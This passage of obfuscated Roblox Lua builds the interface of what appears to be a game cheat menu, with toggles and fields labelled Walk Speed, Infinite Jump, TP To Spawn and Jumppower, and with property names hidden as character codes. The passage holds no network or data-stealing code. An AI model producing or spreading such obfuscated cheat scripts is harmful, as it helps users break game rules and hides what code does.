_llza[_sc(49,57,50)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,57,50)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,57,50)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(49,57,51)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,57,49)]);
_llza[_sc(49,57,51)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,57,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,57,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,57,51)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(49,57,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,57,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,57,52)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,57,51)]);
_llza[_sc(49,57,52)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,57,52)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,57,53)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,57,49)]);
_llza[_sc(49,57,53)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,57,54)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,55,56)]);
_llza[_sc(49,57,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(49,57,54)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=3;
_llza[_sc(49,57,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,57,54)][_sc(78,97,109,101)]=[[Walkspeed]];
_llza[_sc(49,57,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,57,54)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,57,54)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(49,57,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,57,55)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,57,54)]);
_llza[_sc(49,57,55)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(49,57,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,57,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,57,55)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,57,55)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,57,55)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,57,55)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,57,55)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(49,57,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,57,55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,57,55)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(49,57,56)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,57,55)]);
_llza[_sc(49,57,56)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(49,57,56)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(49,57,56)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,57,56)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,57,57)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,57,55)]);
_llza[_sc(49,57,57)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,57,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,57,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,57,57)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(49,57,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,57,97)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,57,57)]);
_llza[_sc(49,57,97)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,57,97)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,57,98)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,57,57)]);
_llza[_sc(49,57,98)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,57,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,57,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,57,98)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(49,57,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,57,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,57,99)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,57,98)]);
_llza[_sc(49,57,99)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,57,99)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,57,100)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,57,54)]);
_llza[_sc(49,57,100)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,57,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,57,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,57,100)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,57,100)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,57,100)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,57,100)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(49,57,100)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,57,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,57,100)][_sc(84,101,120,116)]=[[Walk Speed]];
_llza[_sc(49,57,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,57,100)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(49,57,100)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,57,100)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(49,57,101)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,57,100)]);
_llza[_sc(49,57,101)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(49,57,102)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,57,100)]);
_llza[_sc(49,57,102)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,97,48)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,57,54)]);
_llza[_sc(49,97,48)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(49,97,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,57,54)]);
_llza[_sc(49,97,49)][_sc(90,73,110,100,101,120)]=55;
_llza[_sc(49,97,49)][_sc(83,105,122,101)]=UDim2.new(0, 70, 0, 20);
_llza[_sc(49,97,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,97,49)][_sc(78,97,109,101)]=[[WalkspeedChanger]];
_llza[_sc(49,97,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,97,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,97,49)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(1, -70, 0, 0);
_llza[_sc(49,97,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,97,50)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,97,49)]);
_llza[_sc(49,97,50)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(49,97,50)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(49,97,50)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,97,50)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,97,51)]=Instance.new(_sc(84,101,120,116,66,111,120),_llza[_sc(49,97,49)]);
_llza[_sc(49,97,51)][_sc(80,108,97,99,101,104,111,108,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(49,97,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,97,51)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,97,51)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,97,51)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,97,51)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(49,97,51)][_sc(80,108,97,99,101,104,111,108,100,101,114,84,101,120,116)]=[[(16)]];
_llza[_sc(49,97,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,97,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,97,51)][_sc(84,101,120,116)]=[[]];
_llza[_sc(49,97,51)][_sc(78,97,109,101)]=[[textbox]];
_llza[_sc(49,97,52)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,97,51)]);
_llza[_sc(49,97,52)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,97,52)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,97,52)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(49,97,53)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,97,51)]);
_llza[_sc(49,97,53)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,97,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,97,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,97,53)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(49,97,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,97,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,97,54)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,97,53)]);
_llza[_sc(49,97,54)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,97,54)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,97,55)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,97,51)]);
_llza[_sc(49,97,55)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,97,56)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,55,56)]);
_llza[_sc(49,97,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(49,97,56)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=5;
_llza[_sc(49,97,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,97,56)][_sc(78,97,109,101)]=[[InfJump]];
_llza[_sc(49,97,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,97,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,97,56)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(49,97,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,97,57)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,97,56)]);
_llza[_sc(49,97,57)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(49,97,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,97,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,97,57)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,97,57)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,97,57)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,97,57)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,97,57)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(49,97,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,97,57)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,97,57)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(49,97,97)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,97,57)]);
_llza[_sc(49,97,97)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(49,97,97)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(49,97,97)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,97,97)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,97,98)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,97,57)]);
_llza[_sc(49,97,98)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,97,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,97,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,97,98)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(49,97,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,97,99)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,97,98)]);
_llza[_sc(49,97,99)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,97,99)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,97,100)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,97,98)]);
_llza[_sc(49,97,100)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,97,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,97,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,97,100)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(49,97,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,97,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,97,101)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,97,100)]);
_llza[_sc(49,97,101)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,97,101)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,97,102)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,97,56)]);
_llza[_sc(49,97,102)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,97,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,97,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,97,102)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,97,102)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,97,102)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,97,102)][_sc(83,105,122,101)]=UDim2.new(0, 155, 0, 20);
_llza[_sc(49,97,102)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,97,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,97,102)][_sc(84,101,120,116)]=[[Infinite Jump]];
_llza[_sc(49,97,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,97,102)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(49,97,102)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,97,102)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(49,98,48)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,97,102)]);
_llza[_sc(49,98,48)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(49,98,49)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,97,102)]);
_llza[_sc(49,98,49)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,98,50)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,97,56)]);
_llza[_sc(49,98,50)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(49,98,51)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,55,56)]);
_llza[_sc(49,98,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 23);
_llza[_sc(49,98,51)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=10;
_llza[_sc(49,98,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,98,51)][_sc(78,97,109,101)]=[[TPSpawn]];
_llza[_sc(49,98,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,98,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,98,51)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(49,98,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,98,52)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,98,51)]);
_llza[_sc(49,98,52)][_sc(90,73,110,100,101,120)]=49;
_llza[_sc(49,98,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,98,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,98,52)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,98,52)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,98,52)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,98,52)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,98,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,98,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,98,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,98,52)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(49,98,53)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,98,52)]);
_llza[_sc(49,98,53)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(49,98,53)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(49,98,53)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,98,53)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,98,54)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,98,52)]);
_llza[_sc(49,98,54)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,98,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,98,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,98,54)][_sc(78,97,109,101)]=[[buttonFrame]];
_llza[_sc(49,98,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,98,55)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,98,54)]);
_llza[_sc(49,98,55)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,98,55)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,98,56)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,98,54)]);
_llza[_sc(49,98,56)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,98,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,98,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,98,56)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(49,98,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,98,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,98,57)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,98,56)]);
_llza[_sc(49,98,57)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,98,57)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,98,97)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,98,52)]);
_llza[_sc(49,98,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,98,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,98,97)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,98,97)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,98,97)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,98,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,98,97)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,98,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,98,97)][_sc(84,101,120,116)]=[[TP To Spawn]];
_llza[_sc(49,98,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,98,97)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(49,98,97)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,98,98)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,98,97)]);
_llza[_sc(49,98,98)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,98,99)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,98,51)]);
_llza[_sc(49,98,99)][_sc(90,73,110,100,101,120)]=90;
_llza[_sc(49,98,99)][_sc(83,105,122,101)]=UDim2.new(0, 0, 1, 0);
_llza[_sc(49,98,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,98,99)][_sc(78,97,109,101)]=[[fillbar]];
_llza[_sc(49,98,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,98,99)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=0.95;
_llza[_sc(49,98,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,98,100)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,55,56)]);
_llza[_sc(49,98,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(49,98,100)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=4;
_llza[_sc(49,98,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,98,100)][_sc(78,97,109,101)]=[[Jumppower]];
_llza[_sc(49,98,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,98,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,98,100)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
